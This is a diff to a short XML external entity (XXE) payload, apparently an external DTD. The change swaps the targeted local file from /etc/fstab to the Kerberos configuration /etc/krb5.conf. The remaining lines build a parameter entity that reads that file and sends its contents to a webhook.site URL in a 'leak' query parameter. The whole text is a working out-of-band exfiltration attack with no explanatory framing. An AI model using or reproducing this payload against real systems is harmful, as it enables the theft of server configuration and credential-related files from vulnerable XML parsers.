@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/fstab">
+<!ENTITY % file SYSTEM "file:///etc/krb5.conf">
 <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/f95fe7dd-1257-496c-aded-b96ce43c7d89?leak=%file;'>">
 %eval;
 %send;
